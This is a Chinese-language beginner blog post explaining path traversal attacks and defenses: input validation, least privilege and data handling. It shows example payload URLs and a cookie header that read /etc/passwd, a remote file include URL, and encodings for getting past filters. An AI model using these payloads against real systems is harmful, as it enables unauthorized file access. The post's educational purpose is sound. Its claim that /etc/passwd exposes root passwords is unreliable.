<!DOCTYPE html><html domain=cymetrics.io ga-id=G-3VBVCXV9Z0 lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1" name=viewport><link href="/img/favicon/favicon-192x192.png?hash=42b087227d" rel=icon type=image/png><meta content=#f9c412 name=theme-color><meta content="max-snippet:-1, max-image-preview: large, max-video-preview: -1" name=robots><title>零基礎資安系列（五）-路徑遍歷（Path Traversal）</title><meta content="零基礎資安系列（五）-路徑遍歷（Path Traversal）" property=og:title><meta content="# 前言 路徑遍歷（Path Traversal）就像想像網站是一個博物館，裡面有許多房間，其中有些房間是 Staff Only 而且門上了鎖不讓訪客進入，但有趣的是博物館裡的每一個房間都有通風口，只要知道房間位置，就可以透過其他房間的通風口前往 Staff Only..." name=description><meta content="# 前言 路徑遍歷（Path Traversal）就像想像網站是一個博物館，裡面有許多房間，其中有些房間是 Staff Only 而且門上了鎖不讓訪客進入，但有趣的是博物館裡的每一個房間都有通風口，只要知道房間位置，就可以透過其他房間的通風口前往 Staff Only..." property=og:description><meta content=summary_large_image name=twitter:card><meta content=@ name=twitter:site><meta content=@ name=twitter:creator><meta content=https://tech-blog.cymetrics.io/img/posts/jo/zerobased-path-traversal/cover.jpeg property=og:image><meta content=hsZQwAip9iIbys-i4PJp_MfpNiA6w6RB0hYdWLiLUuk name=google-site-verification><link href=https://tech-blog.cymetrics.io/posts/jo/zerobased-path-traversal/ rel=canonical><meta content=no-referrer-when-downgrade name=referrer><link href=/feed/feed.xml rel=alternate type=application/atom+xml title="Cymetrics Tech Blog"><link href=/ rel=preconnect crossorigin=""><script async src="/js/min.js?hash=b870cb012d" defer></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-3VBVCXV9Z0"></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3VBVCXV9Z0');</script><script csp-hash="">if (/Mac OS X/.test(navigator.userAgent))document.documentElement.classList.add('apple')</script><style>:root{--primary-color: #00bcb2;--primary-dark-color: #ffd349;--fgColor: #222;--bgColor: #eee;--primary: var(--primary-color);--primary-dark: var(--primary-dark-color);--fg: var(--fgColor);--bg: var(--bgColor);--progressColor: #ffd349;--main-width: calc(100vw - 3em)}main img{content-visibility:auto}article *{scroll-margin-top:50px}header nav{z-index:1;position:fixed;top:0;left:0;width:100vw;padding:.375em 1.5em;background:rgba(255,255,255,.9);font-weight:200;text-align:right}@media (min-width:37.5em){:root{--main-width: calc(37.5em - 3em)}}share-widget{position:fixed;right:20px;bottom:20px;opacity:.9;width:50px;height:50px;border-radius:50%;overflow:hidden;box-shadow:2px 3px 5px 2px rgba(0,0,0,.2)}@media screen and (max-width:376px){share-widget{display:none}}share-widget div{margin-left:50%;transform:translateX(-50%);width:20px;height:20px;background-image:url(/img/share.svg);background-repeat:no-repeat;background-position:center;background-size:contain}.apple share-widget div{background-image:url(/img/share-apple.svg)}share-widget button{margin:0;padding:0;width:100%;height:100%;transition:.3s}share-widget button:active{transform:scale(1.2)}dialog{background-color:var(--primary-dark);position:fixed;opacity:.8;z-index:1000;font-size:10px}#nav{z-index:2;position:relative}#reading-progress{z-index:1;background-color:var(--progressColor);width:100vw;position:absolute;left:0;top:0;bottom:0;transform:translate(-100vw,0);will-change:transform;pointer-events:none}html{line-height:1.15;-webkit-text-size-adjust:100%;font-family:"Open Sans",-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Noto Sans","Helvetica Neue",Helvetica,Arial,"Noto Sans TC","PingFang TC","Hiragino Sans GB","Heiti TC","Microsoft YaHei","Microsoft Jhenghei",sans-serif;--font-family: "Open Sans", -apple-system, system-ui, BlinkMacSystemFont,
    "Segoe UI", Roboto, "Noto Sans", "Helvetica Neue", Helvetica, Arial,
    "Noto Sans TC", "PingFang TC", "Hiragino Sans GB", "Heiti TC",
    "Microsoft YaHei", "Microsoft Jhenghei", sans-serif}body{margin:0}h1{text-align:left;font-size:3em;line-height:1.25;margin:.67em 0 .5em;font-size:2.074rem}hr{box-sizing:content-box;height:0;overflow:visible;border-bottom:1px solid var(--fg)}a{background-color:transparent;text-decoration:none;color:var(--primary)}b,strong{font-weight:700}img{border-style:none;max-width:100%;height:auto;margin:0 auto}button,input{font-family:inherit;font-size:100%;line-height:1.15;overflow:visible}button{text-transform:none}input{margin:0}[type=button],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}[type=checkbox]{box-sizing:border-box;padding:0}summary{display:list-item}h2{font-size:2.5em;line-height:1.2;margin-bottom:.6em}h3{font-size:2em;line-height:1.125;margin-bottom:.75em;font-size:1.4rem}h4{font-size:1.5em;margin-bottom:1em;line-height:1.5em}body,p,pre{font-size:1em}p,pre{margin-bottom:1.5em}h1,h2{line-height:2.4rem;margin-bottom:1.36rem}h2{font-size:1.728rem}h3,h4{line-height:1.5rem;margin-bottom:1rem}h4{font-size:1.2rem}body,p,pre{font-size:1rem;line-height:1.6}p,pre{margin-bottom:1.36rem}@media (min-width:600px){h1{font-size:3.0978rem;line-height:1.25}h2{font-size:2.7097rem;line-height:2.52rem}h3{font-size:1.7989rem;line-height:2rem}h4{font-size:1.3554rem;line-height:1.56rem;margin-bottom:1.296rem}body,p,pre{font-size:1.1rem;line-height:1.6}h1,h2,h3,p,pre{margin-bottom:1.496rem}}@media (min-width:1200px){h1{font-size:3rem}h2{font-size:2.05rem}h3{font-size:1.5rem}h4{font-size:1.15rem;line-height:1.42rem;margin-bottom:1.2rem}body,p,pre{font-size:1.2rem;line-height:1.6}h1,h2,h3,p,pre{margin-bottom:1.632rem}}code,pre{overflow-x:auto}pre{font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace}pre code:not([class]){padding:1.5em;overflow-x:scroll}code{border-radius:.3em;color:var(--primary);padding:0 .3em;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:90%;background:#2d2d2d}h1,h2,h3,h4{font-family:var(--font-family)}a:hover{text-decoration:underline}button,input{border-radius:.3em;max-width:100%}input{padding:.75em;margin-bottom:1.5em;display:inline}button+input[type=checkbox],button+label,input+input[type=checkbox],input+label,label+*{page-break-before:always}.copyright,button,label{display:inline-block}button{background:#f2f2f2;color:#191919;cursor:pointer;padding:.75em 1.5em;text-align:center;margin:0 .75em 1.5em 0}button:hover{background:#d9d9d9;color:#000}button:not([disabled]){background:#f9c412;color:#181818;background:var(--primary)}button:not([disabled]):hover{background:#ba9005;color:#000;background:var(--primary-dark)}input[type=file],input[type=url]{border:1px solid #595959;padding:.75em}input[type=checkbox]{flex-grow:0;margin:.75em .375em .75em 0;vertical-align:middle}input[type=checkbox]+label{page-break-before:avoid}*{border:0;box-sizing:border-box}body,header nav a{font-family:var(--font-family)}body{background:var(--bg);color:var(--fg)}header label{display:block}header{padding:4.5em 1.5em 3em;width:42.5em;margin:0 auto;text-align:center;max-width:100%;display:flex;align-items:center;flex-direction:column}header p{margin-top:0}header nav h1{float:left;font-size:inherit;line-height:inherit;margin:0;text-align:left}header nav a{font-weight:700;text-decoration:none;color:#181818;margin-left:1.5em}header nav a:first-of-type{margin-left:auto}header nav a:last-of-type{margin-right:1.5em}header nav label{color:#000;cursor:pointer;margin:0;font-style:normal;text-align:right}main{max-width:70rem;margin:0 auto;border-top:.5px solid #ccc;min-height:60vh}footer{font-size:14px;padding:3em;text-align:center}footer>*{margin:.5em}footer nav a img{vertical-align:middle}footer nav,footer p{font-size:90%}article{max-width:100%;padding:1.5em;width:42.5em;margin:0 auto;word-break:break-word}blockquote{padding:0 1.5em;margin:1.5em 0 1.5em 1.5em;border-left:4px solid var(--primary)}blockquote footer{background:0 0;display:block;color:#ccc;padding:.75em 0;font-size:90%;text-align:start}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto;background:#2d2d2d}.avatar{width:50px;height:50px;border-radius:50%;overflow:hidden;margin:inherit}.avatar-large{width:75px;height:75px}.utterances{position:relative;box-sizing:border-box;width:100%;max-width:760px;margin-left:auto;margin-right:auto}.flex{display:flex}.items-center{align-items:center}.w-full{width:100%}#menu__control,.menu__btn{display:none}.menu__btn span{opacity:0;width:1px;height:1px;overflow:hidden;display:block}nav a:hover{color:#595959}@media screen and (max-width:960px){#nav .nav__links a{margin-right:.5rem;margin-left:.5rem}}@media screen and (max-width:840px){header nav{padding:0}#nav,.menu__btn{position:relative}#nav h1{padding:.375rem 1.5rem;justify-content:space-between}#nav h1 *{margin:0}.menu__btn{display:inline-block;width:1.5rem;height:1.5rem;border:1px solid #191919;border-radius:.3rem}.menu__btn::before{content:"";position:absolute;top:51%;left:50%;transform:translate(-50%,-50%);height:.1rem;width:.9rem;background-color:#2d2d2d;border-radius:.1rem;box-shadow:0 .3rem 0 #2d2d2d,0 -.3rem 0 #2d2d2d}.menu__btn:hover{filter:brightness(.6)}#nav h1,.nav__links{display:flex;align-items:center;width:100%}.nav__links{flex-direction:column;justify-content:center;height:0;max-height:0;overflow:hidden;position:absolute;top:2.24em;transition:max-height .6s ease;margin:0;padding:0;z-index:-1;background:rgba(255,255,255,.9)}.nav__links a{text-align:center;width:100%;padding:.5rem 0;transition:all .3s ease-out}.nav__links a:hover{color:#f9c412;background:rgba(245,245,245,.9)}#menu__control:checked+.nav__links{height:auto;max-height:100vh}}#rss{vertical-align:text-top}#nav{display:flex}#color-scheme-toggle{cursor:pointer;vertical-align:text-top;display:inline-block;margin-right:1em}body.dark{--fg: var(--bgColor);--bg: var(--fgColor);--primary: var(--primary-dark-color);--paginationCurrentColor: #666356}@media (prefers-color-scheme:dark){body.dark{--fg: var(--bgColor);--bg: var(--fgColor);--primary: var(--primary-dark-color);--paginationCurrentColor: #666356}}.posts{max-width:100%}.post{display:flex;margin-bottom:1em;padding:1em 0}.summary{font-size:1rem;line-height:1.25rem;margin:.5em 0;overflow:hidden;word-break:break-word}@media (max-width:480px){.post{padding:0}.summary{display:none}}</style></head><body><header><nav><div id=nav><h1><a href=/ title=Homepage>Cymetrics Tech Blog</a> <label class=menu__btn for=menu__control><span>Menu</span></label></h1><img alt="switch dark mode" height=22 src=/img/dark.svg width=22 id=color-scheme-toggle> <input id=menu__control type=checkbox><div class=nav__links><a href=/posts/ >Archive</a> <a href=/tags/ >Tags</a> <a href=/about/ >About</a></div></div><div id=reading-progress aria-hidden=true></div></nav><h1 class=w-full>零基礎資安系列（五）-路徑遍歷（Path Traversal）</h1><aside class=w-full><div class="flex items-center"><picture><source sizes="(max-width: 608px) 100vw, 608px" srcset="/img/authors/jo_logo-1920w.avif 1920w, /img/authors/jo_logo-1280w.avif 1280w, /img/authors/jo_logo-640w.avif 640w, /img/authors/jo_logo-320w.avif 320w" type=image/avif><source sizes="(max-width: 608px) 100vw, 608px" srcset="/img/authors/jo_logo-1920w.webp 1920w, /img/authors/jo_logo-1280w.webp 1280w, /img/authors/jo_logo-640w.webp 640w, /img/authors/jo_logo-320w.webp 320w" type=image/webp><source sizes="(max-width: 608px) 100vw, 608px" srcset="/img/authors/jo_logo-1920w.jpg 1920w, /img/authors/jo_logo-1280w.jpg 1280w, /img/authors/jo_logo-640w.jpg 640w, /img/authors/jo_logo-320w.jpg 320w" type=image/jpeg><img alt=avatar height=262 src=/img/authors/jo_logo-1920w.jpg width=262 class=avatar decoding=async loading=lazy style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 262 262'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAIAAABLbSncAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQI1wHIADf/ALytr8izsaGDh31sdqSNh9ivnuCzpLWilQCzpavRvr6sk5NKNjg/LiaBY1natKfDsqgAvKyk5NfRw62lrnhnyIVzf2deubSw49XPANOOfsayrM2dltCPfsyMfaVmXI5xbqOjpQDKs6fcz8rawsLOjoPNhneqioO3p6TNxcMAd3R+mJKScWxvk2ZebUlFQjM1tpOQ69DCAJySmFdTVBoSFFg+QSAfJRAREiUdHXZmXwDg0stvZ2QzLC87NT4uKi8dGR0YFhgREBBVR2NirT0ThwAAAABJRU5ErkJggg=='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><span style="margin-left: 12px;"><a href=/posts/jo>jo</a> published on 2021-05-30</span></div><div style="text-align: left;"><a href=/tags/security/ class=post-tag>#Security</a> <a href=/tags/zerobased/ class=post-tag>#ZeroBased</a> <a href=/tags/path-traversal/ class=post-tag>#Path Traversal</a></div></aside><dialog id=message></dialog></header><main><article><h2 id=%E5%89%8D%E8%A8%80><a href=#%E5%89%8D%E8%A8%80 class=direct-link>#</a> 前言</h2><blockquote><p>路徑遍歷（Path Traversal）就像想像網站是一個博物館，裡面有許多房間，其中有些房間是 Staff Only 而且門上了鎖不讓訪客進入，但有趣的是博物館裡的每一個房間都有通風口，只要知道房間位置，就可以透過其他房間的通風口前往 Staff Only 的房間獲得所有你想要的資料。</p></blockquote><h2 id=%E9%87%8B%E4%BE%8B><a href=#%E9%87%8B%E4%BE%8B class=direct-link>#</a> 釋例</h2><p>今天想和大家聊聊在網站安全上攻擊者容易執行但卻常被開發者忽略的路徑遍歷（Path Traversal）攻擊，談談關於路徑遍歷在網站安全上可能造成的風險以及如何預防。</p><p>通常路徑遍歷也被稱目錄遍歷（Directory Traversal），但他有個更具體而且蠻可愛的名字叫做點點斜線攻擊（Dot dot slash attack），那為什麼會叫這個名字呢？</p><p>舉個實際的例子，Linux 中，目錄的顯示是 / Users / hello / Desktop / file，如果使用者輸入 cd ../ 指令時，當前的目錄就會回到上一層，那這會有什麼問題？當這個指令是任一使用者測試在網站 URL 上輸入 ../ 都可以成功執行回到網站目錄上一層的時候問題就大條了，這表示告訴攻擊者，我有路徑遍歷的風險，你可以開始嘗試囉！</p><h2 id=%E5%B8%B8%E8%A6%8B%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95><a href=#%E5%B8%B8%E8%A6%8B%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95 class=direct-link>#</a> 常見的路徑遍歷攻擊手法</h2><p>以下拿幾個路徑遍歷的攻擊常見的範例來說明：</p><p>假設網址呈現的方式為：</p><pre class=language-txt><code class=language-txt>https://www.example.com/get-files?file=report.pdf</code></pre><p>而攻擊者在真正的執行路徑遍歷攻擊以前，常會使用絕對路徑遍歷的手法探測目標網站的網站架構，例如說：</p><pre class=language-txt><code class=language-txt>https://www.example.com/get-files?file=/etc/passwd</code></pre><p>，嘗試以常用的系統絕對路徑試探是否有回應當，當伺服器回應有關網站應用程序中的錯誤的信息時，攻擊者可以更容易猜測正確的位置（例如顯示原始碼的文件路徑）。</p><h3 id=1.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%A8%AA%E5%95%8F%E7%9B%AE%E9%8C%84%E5%A4%96%E7%9A%84%E8%B7%AF%E5%BE%91%EF%BC%9A><a href=#1.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%A8%AA%E5%95%8F%E7%9B%AE%E9%8C%84%E5%A4%96%E7%9A%84%E8%B7%AF%E5%BE%91%EF%BC%9A class=direct-link>#</a> 1.攻擊者嘗試訪問目錄外的路徑：</h3><pre class=language-txt><code class=language-txt>https://www.example.com/../../../../some dir/some file</code></pre><p>攻擊者藉由多次的 ../ 來超脫當前的目錄，訪問不在目錄下的資料。</p><h3 id=2.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%AE%80%E5%8F%96%E7%9B%AE%E9%8C%84%E4%B8%AD%E7%9A%84%E7%B3%BB%E7%B5%B1%E6%AA%94%E6%A1%88><a href=#2.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%AE%80%E5%8F%96%E7%9B%AE%E9%8C%84%E4%B8%AD%E7%9A%84%E7%B3%BB%E7%B5%B1%E6%AA%94%E6%A1%88 class=direct-link>#</a> 2.攻擊者嘗試讀取目錄中的系統檔案</h3><pre class=language-txt><code class=language-txt>https://www.example.com/get-files?file=/etc/passwd</code></pre><p>攻擊者藉由 /etc/passwd 來嘗試直接讀取系統檔案，如果真的被攻擊者讀取到 /etc/passwd 檔的話，攻擊者很有可能藉此解讀 root user 的密碼，另外，值得一提的是，如果網站架在 Windows 的系統中的話，攻擊者只能訪問Web根目錄所在的磁碟分區，但如果是在 Linux 系統中的話，攻擊者則可以訪問整個磁碟。</p><h3 id=3.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E4%BD%BF%E7%B6%B2%E7%AB%99%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E6%96%87%E4%BB%B6%E6%88%96%E8%85%B3%E6%9C%AC><a href=#3.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E4%BD%BF%E7%B6%B2%E7%AB%99%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E6%96%87%E4%BB%B6%E6%88%96%E8%85%B3%E6%9C%AC class=direct-link>#</a> 3.攻擊者嘗試使網站引用外部文件或腳本</h3><pre class=language-txt><code class=language-txt>https://www.example.com/get-files?file=http://other-site.com/malicius-code.php</code></pre><p>攻擊者藉由嘗試將其他網站中的文件包含到當前網站的目錄，讓系統去引用攻擊者的惡意外部文件或腳本，進而達到提權或是竊取機敏資料的目的。</p><h3 id=4.%E6%94%BB%E6%93%8A%E8%80%85%E4%BB%A5%E7%AB%84%E6%94%B9-http-%E7%9A%84%E8%AB%8B%E6%B1%82%E8%97%89%E6%AD%A4%E5%B0%8D%E4%BC%BA%E6%9C%8D%E5%99%A8%E7%99%BC%E8%B5%B7%E6%94%BB%E6%93%8A><a href=#4.%E6%94%BB%E6%93%8A%E8%80%85%E4%BB%A5%E7%AB%84%E6%94%B9-http-%E7%9A%84%E8%AB%8B%E6%B1%82%E8%97%89%E6%AD%A4%E5%B0%8D%E4%BC%BA%E6%9C%8D%E5%99%A8%E7%99%BC%E8%B5%B7%E6%94%BB%E6%93%8A class=direct-link>#</a> 4.攻擊者以竄改 HTTP 的請求藉此對伺服器發起攻擊</h3><pre class=language-txt><code class=language-txt>GET /vulnerable.php HTTP/1.0   <br>Cookie: TEMPLATE=../../../../../../../../../etc/passwd</code></pre><p>與上列不同的是攻擊者不是經由竄改 URL 而達成路徑遍歷的攻擊，而是藉由竄改 HTTP 的請求以多次的../來超脫當前網站的目錄，使伺服器回應傳送 etc/passwd 解讀 root user 的密碼。</p><h2 id=%E8%AE%8A%E5%BD%A2%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A><a href=#%E8%AE%8A%E5%BD%A2%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A class=direct-link>#</a> 變形的路徑遍歷攻擊</h2><p>在看完上述所說明的攻擊之後，你可能想說那我只要擋掉使用者在我的 URL 以及 HTTP 請求的輸入進行驗證及限制，不允許../的出現，那麼針對路徑遍歷的攻擊也就無用武之地了吧？</p><p>一個好消息和一個壞消息告訴你，好消息是你的觀念正確，對URL 以及 HTTP 請求的輸入進行驗證及限制的確是避免路徑遍歷攻擊的應對策略之一，但壞消息是../是有變形的，而且還有很多種變形，其中最常見的變形就是在<strong>零基礎資安系列(二)-認識 XSS(Cross-Site Scripting)</strong> 中和大家提過的HTML Encoder 會將 <code>%2e%2e%2f</code> 解析為 ../ 繞過針對 ../ 的檢查，除此之外還有 UTF-8 編碼 <code>%c1%1c</code> 會被解析為 / ，以及若是更進階一點的話攻擊者還可能使用 xor 概念，<code>%d0^%ff = /</code> 的編碼方式，繞過限制的字元，如果大家對攻擊者可能使用的進階 injection 有興趣，我之後會再寫一篇文章和大家說明，在這裡主要想告訴大家的是限制字元的輸入是個好的應對策略，但前提是將所有攻擊者可能的攻擊方式全部寫進規則中，否則仍然會使攻擊者有機可趁。</p><h2 id=%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6><a href=#%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6 class=direct-link>#</a> 如何防禦</h2><p>上面說了這麼多攻擊者可能的攻擊方式，又表示有那麼多變形的路徑遍歷攻擊，那難道我們對攻擊者就無計可施了嗎？</p><p>當然不是！依據我的經驗，針對路徑遍歷攻擊的防禦可以從三個方面來看</p><p><strong>1.輸入驗證</strong></p><p>針對路徑遍歷攻擊最直覺的防禦就是驗證及限制所有在 URL 以及 HTTP 請求，不允許輸入 ../ 以及其他變形的輸入，這方面的防禦強度會在於網站對於輸入驗證的規則完善度而決定。</p><p><strong>2.權限控管</strong></p><p>在開發和部署網頁應用程式的時候盡可能的以最小的權限執行，盡可能的刪除所有不常使用或權限過大的使用者並取消 Guest 角色，建立完整的 ACL（Access Control List） ，且確保文件的可讀可寫權限也的確受到控管（例如Linux 系統盡可能不要有權限 777 的文件，這會讓這份文件全世界可讀可寫），這樣的話即使攻擊者成功的查看網頁目錄，也會因為權限問題而導致無法存取文件，最多只能得知網站目錄架構及檔名。</p><p><strong>3.資料處理</strong></p><p>之所以把資料處裡放在最後一步是因為我認為資料處理是面對攻擊者的最後一道防線，即使攻擊者可以繞過輸入驗證，成功獲得瀏覽目錄的權限，但如果目錄中沒有隱密資料或是將重要資料另外備份在其他的伺服器，例如密碼檔、已經沒有被引用的舊文件、網站備份的資料、Log 紀錄、系統版本紀錄 等，攻擊者在沒有獲得任何有效資料的情況下也只能繼續嘗試其他的攻擊路徑。</p><h2 id=%E7%B5%90%E8%AB%96><a href=#%E7%B5%90%E8%AB%96 class=direct-link>#</a> 結論</h2><p>雖然資料處理是三種防禦中面對攻擊者的最後一道防線，但我認為最重要的防禦還是針對路徑遍歷攻擊的輸入驗證，原因是因為對攻擊者來說，一但發現網站的輸入驗證規則設置周全或是一般常見的手法都沒辦法獲得任何有效的資料時，攻擊者通常會選擇另尋目標，所以我建議的方式會是建立一個針對路徑遍歷攻擊包含 ../ 及 HTML Encoder 編碼規則的輸入驗證會是針對路徑遍歷攻擊首先該做的事，接著才是刪除所有不常使用的使用者權限並且不允許遠端操作，將當前網站目錄中非必要存在的重要檔案另外備份並在當下的目錄中刪除，以上兩件事情可以依據公司的情況做調整，例如帳號權限複雜先不動或重要的檔案位置混亂不好歸納所以先處理權限 等，以公司承擔成本較低的方式自行取捨。</p><p>當以上三種防禦都進行之後，即使攻擊者願意花時間嘗試除了一般常見規則的路徑遍歷攻擊外再特別設計攻擊，並且在進入目錄後連一般使用者權限都沒有的情況下嘗試提權，再提權成功後，看著沒有高重要性資料的目錄同常也會感到挫折。</p><h2 id=%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80><a href=#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80 class=direct-link>#</a> 延伸閱讀</h2><h3 id=%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss(cross-site-scripting)><a href=#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss(cross-site-scripting) class=direct-link>#</a> 零基礎資安系列（二）- 認識 XSS(Cross-Site Scripting)</h3><blockquote><p><a href=https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting>認識 XSS（Cross-Site Scripting）</a></p></blockquote><h4 id=%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E5%9B%9B%EF%BC%89--%E8%AA%8D%E8%AD%98%E6%B3%A8%E5%85%A5%E6%94%BB%E6%93%8A%EF%BC%88-injection-attack%EF%BC%89><a href=#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E5%9B%9B%EF%BC%89--%E8%AA%8D%E8%AD%98%E6%B3%A8%E5%85%A5%E6%94%BB%E6%93%8A%EF%BC%88-injection-attack%EF%BC%89 class=direct-link>#</a> 零基礎資安系列（四）- 認識注入攻擊（ Injection Attack）</h4><blockquote><p><a href=https://tech-blog.cymetrics.io/jo/zerobased-injectionattack>認識注入攻擊（ Injection Attack）</a></p></blockquote><h2 id=%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99><a href=#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99 class=direct-link>#</a> 參考資料</h2><h3 id=owasp-path-traversal><a href=#owasp-path-traversal class=direct-link>#</a> OWASP Path Traversal</h3><blockquote><p><a href=https://owasp.org/www-community/attacks/Path_Traversal target=_blank>https://owasp.org/www-community/attacks/Path_Traversal</a></p></blockquote><h3 id=wikipedia-path-traversal><a href=#wikipedia-path-traversal class=direct-link>#</a> Wikipedia Path Traversal</h3><blockquote><p><a href=https://en.wikipedia.org/wiki/Directory_traversal_attack target=_blank>https://en.wikipedia.org/wiki/Directory_traversal_attack</a></p></blockquote><hr><p></p><h3>Author</h3><div class="flex items-center"><picture><source sizes="(max-width: 608px) 100vw, 608px" srcset="/img/authors/jo_logo-1920w.avif 1920w, /img/authors/jo_logo-1280w.avif 1280w, /img/authors/jo_logo-640w.avif 640w, /img/authors/jo_logo-320w.avif 320w" type=image/avif><source sizes="(max-width: 608px) 100vw, 608px" srcset="/img/authors/jo_logo-1920w.webp 1920w, /img/authors/jo_logo-1280w.webp 1280w, /img/authors/jo_logo-640w.webp 640w, /img/authors/jo_logo-320w.webp 320w" type=image/webp><source sizes="(max-width: 608px) 100vw, 608px" srcset="/img/authors/jo_logo-1920w.jpg 1920w, /img/authors/jo_logo-1280w.jpg 1280w, /img/authors/jo_logo-640w.jpg 640w, /img/authors/jo_logo-320w.jpg 320w" type=image/jpeg><img alt=avatar height=262 src=/img/authors/jo_logo-1920w.jpg width=262 class="avatar avatar-large" decoding=async loading=lazy style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 262 262'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAIAAABLbSncAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQI1wHIADf/ALytr8izsaGDh31sdqSNh9ivnuCzpLWilQCzpavRvr6sk5NKNjg/LiaBY1natKfDsqgAvKyk5NfRw62lrnhnyIVzf2deubSw49XPANOOfsayrM2dltCPfsyMfaVmXI5xbqOjpQDKs6fcz8rawsLOjoPNhneqioO3p6TNxcMAd3R+mJKScWxvk2ZebUlFQjM1tpOQ69DCAJySmFdTVBoSFFg+QSAfJRAREiUdHXZmXwDg0stvZ2QzLC87NT4uKi8dGR0YFhgREBBVR2NirT0ThwAAAABJRU5ErkJggg=='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture><h3 style="margin-left: 12px;"><a href=/posts/jo>jo</a></h3></div><p>Love Cyber Security and commit to Cyber Security science popularization</p><p></p><p><a href=https://tech-blog.cymetrics.io/posts/jo/zerobased-path-traversal/ on-click=share>Share this post</a></p><script async src=https://utteranc.es/client.js crossorigin=anonymous id=utterance-script issue-term=title label=utterance repo=cymetrics/blog theme=github-light></script><share-widget><button aria-label=Share href=https://tech-blog.cymetrics.io/posts/jo/zerobased-path-traversal/ on-click=share><div></div></button></share-widget><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","headline":"零基礎資安系列（五）-路徑遍歷（Path Traversal）","image":["https://tech-blog.cymetrics.io/img/authors/jo_logo-1920w.jpg"],"author":"jo","genre":"Insert a schema.org genre","publisher":{"@type":"Organization","name":"Cymetrics Tech Blog","logo":{"@type":"ImageObject","url":"/img/favicon/favicon-192x192.png?hash=42b087227d"}},"url":"https://tech-blog.cymetrics.io/posts/jo/zerobased-path-traversal/","mainEntityOfPage":"https://tech-blog.cymetrics.io/posts/jo/zerobased-path-traversal/","datePublished":"2021-05-30","dateModified":"2021-07-27","description":"# 前言 路徑遍歷（Path Traversal）就像想像網站是一個博物館，裡面有許多房間，其中有些房間是 Staff Only 